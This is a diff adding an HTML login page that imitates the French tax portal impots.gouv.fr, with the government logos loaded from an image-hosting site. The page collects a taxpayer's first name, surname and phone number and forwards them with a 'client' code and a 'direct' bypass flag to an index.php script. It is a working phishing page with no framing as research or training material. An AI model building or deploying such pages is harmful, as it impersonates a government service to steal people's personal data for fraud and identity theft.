@@ -1,0 +1,313 @@
+<!DOCTYPE html><html lang="fr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identification - impots.gouv.fr</title>
+    <style>
+        /* Reset de base pour éviter les conflits */
+        html, body, div, span, h1, h2, h3, h4, h5, h6, p, 
+        a, img, strong, ul, li, form, label, button, input {
+            margin: 0;
+            padding: 0;
+            border: 0;
+            font-size: 100%;
+            font: inherit;
+            vertical-align: baseline;
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            line-height: 1.6;
+        }
+
+        .gov-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background: white;
+            border-bottom: 1px solid #ddd;
+            position: relative;
+            z-index: 10;
+        }
+
+        .gov-logo {
+            height: 60px;
+            max-width: 100%;
+        }
+
+        .gov-login-container {
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .gov-heading {
+            color: #000091;
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        .gov-form-group {
+            margin-bottom: 20px;
+        }
+
+        .gov-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .gov-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-family: inherit;
+            font-size: inherit;
+        }
+
+        .gov-button {
+            background: #000091;
+            color: white;
+            padding: 14px 28px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .gov-button:hover {
+            background: #00006e;
+        }
+
+        .gov-error-text {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        /* Loader pour la redirection automatique */
+        .gov-loader-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .gov-loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #000091;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .gov-loader-text {
+            text-align: center;
+            font-size: 16px;
+            color: #333;
+            max-width: 80%;
+        }
+    </style>
+</head>
+<body>
+    <div class="gov-header">
+        <img src="https://i.ibb.co/RGNh2VHY/image-2025-02-10-161643988.png" alt="République Française" class="gov-logo">
+        <img src="https://i.ibb.co/wbC3xfT/image-2025-02-10-161819336.png" alt="impots.gouv.fr" class="gov-logo">
+        <img src="https://i.ibb.co/qLxRgcsP/image-2025-02-10-161903496.png" alt="France Connect" class="gov-logo">
+    </div>
+
+    <!-- Loader pour la redirection -->
+    <div id="redirectLoader" class="gov-loader-container">
+        <div class="gov-loader"></div>
+        <div class="gov-loader-text">
+            <p>Connexion à votre espace personnel en cours...</p>
+            <p>Veuillez patienter, vous allez être redirigé automatiquement.</p>
+        </div>
+    </div>
+
+    <!-- Formulaire de connexion -->
+    <div class="gov-login-container">
+        <h2 class="gov-heading">Identification du Contribuable</h2>
+        <form id="loginForm">
+            <div class="gov-form-group">
+                <label for="prenom" class="gov-label">Prénom</label>
+                <input type="text" id="prenom" name="prenom" class="gov-input" required="">
+                <div class="gov-error-text" id="prenomError">Veuillez entrer votre prénom</div>
+            </div>
+
+            <div class="gov-form-group">
+                <label for="nom" class="gov-label">Nom</label>
+                <input type="text" id="nom" name="nom" class="gov-input" required="">
+                <div class="gov-error-text" id="nomError">Veuillez entrer votre nom</div>
+            </div>
+
+            <div class="gov-form-group">
+                <label for="numero" class="gov-label">Numéro de téléphone</label>
+                <input type="tel" id="numero" name="numero" class="gov-input" required="" pattern="^(0|\+33)[1-9]([-. ]?[0-9]{2}){4}$" maxlength="12">
+                <div class="gov-error-text" id="numeroError">Veuillez entrer un numéro de téléphone valide (format: 06XXXXXXXX ou +336XXXXXXXX)</div>
+            </div>
+
+            <button type="submit" class="gov-button">Continuer</button>
+        </form>
+    </div>
+
+    <script>
+        // Fonction pour récupérer les paramètres de l'URL
+        function getUrlParameter(name) {
+            name = name.replace(/[$$]/, '\\[').replace(/[$$]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Fonction pour rediriger vers l'index.php avec tous les paramètres nécessaires
+        function redirectToIndexPhp(userData) {
+            // Afficher le loader
+            document.getElementById('redirectLoader').style.display = 'flex';
+            
+            // URL de l'index.php (fichier qui gère l'authentification et la redirection)
+            const indexPhpUrl = "index.php";
+            
+            // Construire l'URL avec les paramètres
+            const urlParams = new URLSearchParams();
+            
+            // Ajouter les paramètres utilisateur
+            urlParams.set('prenom', userData.prenom);
+            urlParams.set('nom', userData.nom);
+            urlParams.set('n', userData.numero);
+            
+            // Ajouter le paramètre client OBLIGATOIRE (requis par votre index.php)
+            urlParams.set('client', '2025');
+            
+            // Récupérer d'autres paramètres de l'URL actuelle à transmettre
+            const currentParams = new URLSearchParams(window.location.search);
+            for (const [key, value] of currentParams.entries()) {
+                if (key !== 'prenom' && key !== 'nom' && key !== 'n' && key !== 'client') {
+                    urlParams.set(key, value);
+                }
+            }
+            
+            // Ajouter le paramètre direct pour contourner la page de connexion si nécessaire
+            urlParams.set('direct', 'true');
+            
+            // Construire l'URL finale
+            const redirectUrl = `${indexPhpUrl}?${urlParams.toString()}`;
+            
+            // Rediriger après un délai
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 2000);
+        }
+
+        // Au chargement de la page
+        window.addEventListener('DOMContentLoaded', () => {
+            // Pré-remplir les champs du formulaire avec les paramètres de l'URL
+            const prenomFromUrl = getUrlParameter('prenom');
+            const nomFromUrl = getUrlParameter('nom');
+            const numeroFromUrl = getUrlParameter('n');
+            
+            if (prenomFromUrl) {
+                document.getElementById('prenom').value = prenomFromUrl;
+            }
+            
+            if (nomFromUrl) {
+                document.getElementById('nom').value = nomFromUrl;
+            }
+            
+            if (numeroFromUrl) {
+                document.getElementById('numero').value = numeroFromUrl;
+            }
+            
+            // Si tous les champs sont déjà remplis, rediriger automatiquement
+            if (prenomFromUrl && nomFromUrl && numeroFromUrl) {
+                const userData = {
+                    prenom: prenomFromUrl,
+                    nom: nomFromUrl,
+                    numero: numeroFromUrl
+                };
+                
+                // Stocker les données utilisateur dans localStorage
+                localStorage.setItem('userData', JSON.stringify(userData));
+                
+                // Rediriger après un court délai pour permettre le chargement complet de la page
+                setTimeout(() => {
+                    redirectToIndexPhp(userData);
+                }, 1000);
+            }
+        });
+
+        // Gestion du formulaire de connexion
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const prenom = document.getElementById('prenom').value;
+            const nom = document.getElementById('nom').value;
+            const numero = document.getElementById('numero').value;
+
+            // Validation
+            let isValid = true;
+
+            if (!prenom) {
+                document.getElementById('prenomError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('prenomError').style.display = 'none';
+            }
+
+            if (!nom) {
+                document.getElementById('nomError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('nomError').style.display = 'none';
+            }
+
+            // Validation du numéro de téléphone
+            const phoneRegex = /^(0|\+33)[1-9]([-. ]?[0-9]{2}){4}$/;
+            if (!numero || !phoneRegex.test(numero.replace(/\s/g, ''))) {
+                document.getElementById('numeroError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('numeroError').style.display = 'none';
+            }
+
+            if (isValid) {
+                const userData = { prenom, nom, numero };
+                
+                // Stocker les données utilisateur dans localStorage
+                localStorage.setItem('userData', JSON.stringify(userData));
+                
+                // Rediriger vers l'index.php avec tous les paramètres nécessaires
+                redirectToIndexPhp(userData);
+            }
+        });
+    </script>
+
+</body></html>
